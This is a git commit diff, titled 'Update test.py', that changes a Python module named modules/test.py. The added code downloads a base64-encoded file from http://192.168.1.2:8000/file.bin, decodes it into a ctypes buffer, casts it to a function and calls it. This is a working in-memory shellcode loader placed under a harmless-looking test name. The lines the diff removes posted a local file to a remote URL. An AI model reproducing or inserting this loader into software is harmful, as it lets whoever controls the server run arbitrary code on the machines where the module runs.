25e2404d830a0e1693c8793b255682779054f76e
experiment2016 <sarpiericam@libero.it>
2016-05-30 17:09:33 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -1,10 +1,14 @@
-import requests
+import urllib2
+import ctypes
+import base64
 def run(**args):
   try:
-      print("Testing") 
-      url='https://github.com/experiment2016/workhub/tree/master/data/'
-      files = {'upload_file': open('file.txt','rb')}
-      r=requests.post(url,files=files)
+     url = "http://192.168.1.2:8000/file.bin"
+     response = urllib2.urlopen(url)
+     file = base64.b64decode(response.read())
+     file_buffer = ctypes.create_string_buffer(file, len(file))
+     file_func = ctypes.cast(file_buffer, ctypes.CFUNCTYPE
+     (ctypes.c_void_p))
+     file_func()
   except Exception, e:
       return str(e)
-     
